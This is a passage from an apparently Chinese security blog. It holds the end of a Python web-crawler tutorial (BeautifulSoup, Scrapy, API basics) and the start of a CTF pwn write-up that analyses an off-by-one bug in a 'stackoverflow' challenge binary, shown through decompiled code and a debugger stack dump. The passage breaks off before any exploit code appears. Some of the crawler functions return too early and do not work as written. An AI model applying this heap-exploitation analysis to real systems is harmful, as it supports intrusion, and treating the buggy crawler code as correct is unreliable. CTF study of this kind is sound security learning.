class="line">                pages.add(newPage)</span><br><span class="line">                getLinks(newPage)</span><br><span class="line"></span><br><span class="line">getLinks(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">/wiki/Wikipedia</span><br><span class="line">/wiki/Wikipedia:Protection_policy<span class="meta">#semi</span></span><br><span class="line">/wiki/Wikipedia:Requests_for_page_protection</span><br><span class="line">/wiki/Wikipedia:Requests_for_permissions</span><br><span class="line">/wiki/Wikipedia:Protection_policy<span class="meta">#extended</span></span><br></pre></td></tr></table></figure>
<p>这个爬虫只收集了词条链接的信息，当然也可以改进下，使其可以收集更多信息：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pages = <span class="built_in">set</span>()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLinks</span>(<span class="params">pageUrl</span>):</span></span><br><span class="line">    <span class="keyword">global</span> pages</span><br><span class="line">    html = urlopen(<span class="string">&quot;http://en.wikipedia.org&quot;</span>+pageUrl)</span><br><span class="line">    bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(bsObj.h1.get_text())</span><br><span class="line">        <span class="built_in">print</span>(bsObj.find(<span class="built_in">id</span>=<span class="string">&quot;mw-content-text&quot;</span>).findAll(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(bsObj.find(<span class="built_in">id</span>=<span class="string">&quot;ca-edit&quot;</span>).find(<span class="string">&quot;span&quot;</span>).find(<span class="string">&quot;a&quot;</span>).attrs[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The page is missing some properties! But don&#x27;t worry!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(/wiki/)&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;href&#x27;</span> <span class="keyword">in</span> link.attrs:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> pages:</span><br><span class="line">                newPage = link.attrs[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(newPage)</span><br><span class="line">                pages.add(newPage)</span><br><span class="line">                getLinks(newPage)</span><br><span class="line"></span><br><span class="line">getLinks(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>因为数据有点多并且没有什么价值，所以就不展示了</p>
<h2 id="通过互联网采集"><a href="#通过互联网采集" class="headerlink" title="通过互联网采集"></a>通过互联网采集</h2><p>就像之前的例子一样，我们后面要建立的网络爬虫也是顺着链接从一个页面跳到另一个页面，描绘出一张网络地图</p>
<p>但是这一次，它们不再忽略外链，而是跟着外链跳转，我们想看看爬虫是不是可以记录我们浏览过的每一个页面上的信息，这将是一个新的挑战</p>
<p>相比我们之前做的单个域名采集，互联网采集要难得多 —— 不同网站的布局迥然不同，这就意味着我们必须在要寻找的信息以及查找方式上都极具灵活性</p>
<ul>
<li>我要收集哪些数据？这些数据可以通过采集几个已经确定的网站（永远是最简单的做法）完成吗？或者我的爬虫需要发现那些我可能不知道的网站吗？</li>
<li>当我的爬虫到了某个网站，它是立即顺着下一个出站链接跳到一个新网站，还是在网站上呆一会儿，深入采集网站的内容？</li>
<li>有没有我不想采集的一类网站？我对非英文网站的内容感兴趣吗？</li>
<li>如果我的网络爬虫引起了某个网站网管的怀疑，我如何避免法律责任？</li>
</ul>
<p>先看一个案例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">pages = <span class="built_in">set</span>()</span><br><span class="line">nowTime = time.time()</span><br><span class="line">random.seed(nowTime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInternalLinks</span>(<span class="params">bsObj, includeUrl</span>):</span> <span class="comment"># 获取页面所有内链的列表</span></span><br><span class="line">    internalLinks = []</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(/|.*&quot;</span>+includeUrl+<span class="string">&quot;)&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> internalLinks:</span><br><span class="line">                internalLinks.append(link.attrs[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">                <span class="keyword">return</span> internalLinks</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getExternalLinks</span>(<span class="params">bsObj, excludeUrl</span>):</span> <span class="comment"># 获取页面所有外链的列表</span></span><br><span class="line">    externalLinks = []</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> bsObj.findAll(<span class="string">&quot;a&quot;</span>,href=re.<span class="built_in">compile</span>(<span class="string">&quot;^(http|www)((?!&quot;</span>+excludeUrl+<span class="string">&quot;).)*$&quot;</span>)):</span><br><span class="line">        <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> link.attrs[<span class="string">&#x27;href&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> externalLinks:</span><br><span class="line">                externalLinks.append(link.attrs[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">                <span class="keyword">return</span> externalLinks</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">splitAddress</span>(<span class="params">address</span>):</span> <span class="comment"># 加工静态链接</span></span><br><span class="line">    addressParts = address.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> addressParts</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getRandomExternalLink</span>(<span class="params">startingPage</span>):</span> <span class="comment"># 从内&amp;外链列表中获取随机的外链</span></span><br><span class="line">    html = urlopen(startingPage)</span><br><span class="line">    bsObj = BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    externalLinks = getExternalLinks(bsObj, splitAddress(startingPage)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(externalLinks) == <span class="number">0</span>:</span><br><span class="line">        internalLinks = getInternalLinks(startingPage)</span><br><span class="line">        <span class="keyword">return</span> getRandomExternalLink(internalLinks[random.randint(<span class="number">0</span>,<span class="built_in">len</span>(internalLinks)-<span class="number">1</span>)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> externalLinks[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(externalLinks)-<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">followExternalOnly</span>(<span class="params">startingSite</span>):</span> <span class="comment"># 程序开始</span></span><br><span class="line">    externalLink = getRandomExternalLink(startingSite)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;随机外链是：&quot;</span>+externalLink)</span><br><span class="line">    followExternalOnly(externalLink)</span><br><span class="line"></span><br><span class="line">followExternalOnly(<span class="string">&quot;http://oreilly.com&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\anaconda3\python.exe D:/PythonProject/Crawler/test.py</span><br><span class="line">随机外链是：https:<span class="comment">//twitter.com/oreillymedia</span></span><br><span class="line">随机外链是：https:<span class="comment">//help.twitter.com/using-twitter/twitter-supported-browsers</span></span><br><span class="line">随机外链是：https:<span class="comment">//microsoft.com/edge</span></span><br></pre></td></tr></table></figure>
<p>网站首页上并不能保证一直能发现外链，这时为了能够发现外链，就需要用一种类似前面案例中使用的采集方法，即递归地深入一个网站直到找到一个外链才停止</p>
<p>如果想要收集内&amp;外链，则可以加入以下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">allExtLinks = <span class="built_in">set</span>()</span><br><span class="line">allIntLinks = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAllExternalLinks</span>(<span class="params">siteUrl</span>):</span></span><br><span class="line">    html = urlopen(siteUrl)</span><br><span class="line">    bsObj = BeautifulSoup(html)</span><br><span class="line">    internalLinks = getInternalLinks(bsObj,splitAddress(siteUrl)[<span class="number">0</span>])</span><br><span class="line">    externalLinks = getExternalLinks(bsObj,splitAddress(siteUrl)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> externalLinks:</span><br><span class="line">    <span class="keyword">if</span> link <span class="keyword">not</span> <span class="keyword">in</span> allExtLinks:</span><br><span class="line">        allExtLinks.add(link)</span><br><span class="line">        <span class="built_in">print</span>(link)</span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> internalLinks:</span><br><span class="line">    <span class="keyword">if</span> link <span class="keyword">not</span> <span class="keyword">in</span> allIntLinks:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;即将获取链接的URL是：&quot;</span>+link)</span><br><span class="line">        allIntLinks.add(link)</span><br><span class="line">        getAllExternalLinks(link)</span><br><span class="line">        </span><br><span class="line">getAllExternalLinks(<span class="string">&quot;http://oreilly.com&quot;</span>)</span><br></pre></td></tr></table></figure>
<img src="/2022/04/02/Python%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86/1648810074420.png" class width="1648810074420"> 
<p>写代码之前拟个大纲或画个流程图是很好的编程习惯，这么做不仅可以为你后期处理节省很多时间，更重要的是可以防止自己在爬虫变得越来越复杂时乱了分寸</p>
<h2 id="通过Scrapy采集"><a href="#通过Scrapy采集" class="headerlink" title="通过Scrapy采集"></a>通过Scrapy采集</h2><p>Scrapy 就是一个帮你大幅度降低网页链接查找和识别工作复杂度的 Python 库，它可以 让你轻松地采集一个或多个域名的信息</p>
<p>首先在命令行输入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$scrapy startproject wikiSpider</span><br></pre></td></tr></table></figure>
<p>系统就会自动帮你创建一个 Scrapy 爬虫模板，Scrapy 的每个 Item（条目）对象表示网站上的一个页面，当然，你可以根据需要定义不同的条目（比如 url、content、header image 等），但是现在我只演示收集每页的 title 字段 （field）</p>
<p>先在你的 items.py 文件中写入以下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># http://doc.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Item, Field</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Article</span>(<span class="params">Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    title = Field()</span><br></pre></td></tr></table></figure>
<p>然后在 spiders 目录中新建一个 articleSpider.py 文件，然后写入以下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.selector <span class="keyword">import</span> Selector</span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> wikiSpider.items <span class="keyword">import</span> Article</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArticleSpider</span>(<span class="params">Spider</span>):</span></span><br><span class="line">    name=<span class="string">&quot;article&quot;</span></span><br><span class="line">    allowed_domains = [<span class="string">&quot;en.wikipedia.org&quot;</span>]</span><br><span class="line">    start_urls = [<span class="string">&quot;http://en.wikipedia.org/wiki/Main_Page&quot;</span>,</span><br><span class="line"> <span class="string">&quot;http://en.wikipedia.org/wiki/Python_%28programming_language%29&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = Article()</span><br><span class="line">        title = response.xpath(<span class="string">&#x27;//h1/text()&#x27;</span>)[<span class="number">0</span>].extract()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Title is: &quot;</span>+title)</span><br><span class="line">        item[<span class="string">&#x27;title&#x27;</span>] = title</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
<p>最后在 pycharm 的控制台中输入以下命令来执行爬虫：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ scrapy crawl article</span><br></pre></td></tr></table></figure>
<h2 id="PS-API"><a href="#PS-API" class="headerlink" title="PS:API"></a>PS:API</h2><p>API 为不同的应用提供了方便友好的接口，不同的开发者用不同的架构，甚至不同的语言编写软件都没问题 —— 因为 API 设计的目的就是要成为一种通用语言，让不同的软件进行信息共享</p>
<p>API 可以通过 HTTP 协议下载文件，和 URL 访问网站获取数据的协议一 样，它几乎可以实现所有在网上干的事情，API 之所以叫 API 而不是叫网站的原因，其实是首先 API 请求使用非常严谨的语法，其次 API 用 JSON 或 XML 格式表示数据，而不是 HTML 格式</p>
<p><strong>API通用规则:方法</strong></p>
<p>和大多数网络数据采集的方式不同，API 用一套非常标准的规则生成数据，而且生成的数据也是按照非常标准的方式组织的</p>
<p>利用 HTTP 从网络服务获取信息有四种方式：</p>
<ul>
<li>GET<ul>
<li>GET 就是你在浏览器中输入网址浏览网站所做的事情，当你访问某个网站时，就会使用 GET 方法（可以想象成 GET 在说：“喂，网络服务器，请按 照这个网址给我信息”）</li>
</ul>
</li>
<li>POST<ul>
<li>POST 基本就是当你填写表单或提交信息到网络服务器的后端程序时所做的事情，每次当你登录网站的时候，就是通过用户名和（有可能加密的）密码发起一个 POST 请求（如果你用 API 发起一个 POST 请求，相当于说“请把信息保存到你的数据库里”）</li>
</ul>
</li>
<li>PUT<ul>
<li>PUT 请求用来更新一个对象或信息（例如：API 可能会要求用 POST 请求来创建新用户，但是如果你要更新老用户的邮箱地址，就要用 PUT 请求了）</li>
</ul>
</li>
<li>DELETE<ul>
<li>用于删除一个对象</li>
</ul>
</li>
</ul>
<p><strong>API通用规则:验证</strong></p>
<p>虽然有些 API 不需要验证操作（就是说任何人都可以使用 API，不需要注册），但是很多新式 API 在使用之前都要求客户验证</p>
<p>通常 API 验证的方法都是用类似令牌（token）的方式调用，每次 API 调用都会把令牌传递到服务器上，这种令牌要么是用户注册的时候分配给用户，要么就是在用户调用的时候才提供，可能是长期固定的值，也可能是频繁变化的，通过服务器对用户名和密码的组合处理后生成 </p>
<p>令牌除了在 URL 链接中传递，还会通过请求头里的 cookie 把用户信息传递给服务器</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/02/stdin%E4%BB%BB%E6%84%8F%E5%86%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/02/stdin%E4%BB%BB%E6%84%8F%E5%86%99/" class="post-title-link" itemprop="url">Stdin任意写</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-02 01:49:44" itemprop="dateCreated datePublished" datetime="2022-04-02T01:49:44+08:00">2022-04-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-03 17:19:28" itemprop="dateModified" datetime="2022-04-03T17:19:28+08:00">2022-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>stackoverflow 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./stackoverflow</span><br><span class="line">leave your name, bro:ywx</span><br><span class="line">worrier ywx</span><br><span class="line">, now begin your challengeWelcome to stackoverflow challenge!!!</span><br><span class="line">it is really easy</span><br><span class="line">please input the size to trigger stackoverflow: </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stackoverflow: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.24</span><span class="number">-9u</span>buntu2_amd64/ld<span class="number">-2.24</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">8f</span>56f5f4fdfef79fe7ba6b8b8b042d5ee2b6101b, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/stackoverflow&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x3ff000</span>)</span><br><span class="line">    RUNPATH:  <span class="string">&#x27;/home/yhellow/tools/glibc-all-in-one/libs/2.24-9ubuntu2_amd64/&#x27;</span></span><br></pre></td></tr></table></figure>
<p>64位，dynamically，开了NX，开了canary，Full RELRO</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.24</span><span class="number">-9u</span>buntu2<span class="number">.2</span>)</span> stable release versi</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">leak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;leave your name, bro:&quot;</span>);</span><br><span class="line">  read_s(v1, <span class="number">80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;worrier %s, now begin your challenge&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数没有溢出，就是让我们来 leak libc_base 的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> data; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">  IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">  v2 = data;</span><br><span class="line">  <span class="keyword">while</span> ( data &gt; <span class="number">3145728</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too much bytes to do stackoverflow.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  chunk_list = (__int64)<span class="built_in">malloc</span>(data + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_list )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;padding and ropchain: &quot;</span>);</span><br><span class="line">  read_s((<span class="keyword">void</span> *)chunk_list, data);</span><br><span class="line">  *(_BYTE *)(chunk_list + v2) = <span class="number">0</span>;              <span class="comment">// 末尾置空:off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>末尾字节置空，导致 off-by-one</p>
<p>data 的大小不能超过“3145728”，否则重新输入，但是后面却根据“v2”的大小来进行索引置空，也许有用</p>
<p><strong>入侵思路</strong></p>
<p>先获取 libc_base </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x5000000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffde68</span> —▸ <span class="number">0x7fffffffde90</span> ◂— <span class="number">0x3131313131313131</span> (<span class="string">&#x27;11111111&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffde70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fffffffde78</span> ◂— <span class="number">0x2711fc69c0f4a500</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rbp <span class="number">0x7fffffffde80</span> —▸ <span class="number">0x7fffffffdf00</span> —▸ <span class="number">0x7fffffffdf20</span> —▸ <span class="number">0x400ae0</span> ◂— <span 